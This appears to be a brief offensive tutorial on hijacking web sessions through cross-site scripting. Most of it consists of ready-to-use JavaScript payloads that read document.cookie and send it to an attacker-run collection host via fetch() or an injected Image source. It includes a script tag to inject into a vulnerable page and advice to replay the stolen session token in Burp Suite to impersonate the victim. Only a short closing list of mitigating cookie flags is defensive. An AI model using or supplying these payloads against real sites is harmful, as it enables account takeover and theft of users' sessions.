# Session Hijacking with XSS

**Document.cookie** Is a JavaScript-accessible storage area that stores session tokens, auth IDs, etc.
- If a web app doesn’t protect it with `HttpOnly`, you can steal it using XSS.

```js
alert(document.cookie);
```
**Boom.** You see the victim’s session token
- You now control their account if the site is weak.

## simple payload to steal and send cookies to my server
```js
fetch("https://your-webhook-url.com?cookie=" + document.cookie);
```
**OR**

```js
new Image().src = "https://your-webhook-url.com?c=" + document.cookie;
```
## Real world case
- If a site sets
`Set-Cookie: session=eyJ1c2VyIjoiam9obiJ9; Path=/; Secure`
But no `HttpOnly`?
- You inject
```js
<script>
  new Image().src = "https://yourbin.com/?c=" + document.cookie;
</script>
```
- Replay it using burpsuite to impersonate the user.

  ## This wont work if:
- the cookie has HttpOnly → can't be stolen by JS
- it's SameSite=Strict → won't be sent cross-site
- the session system expires tokens fast
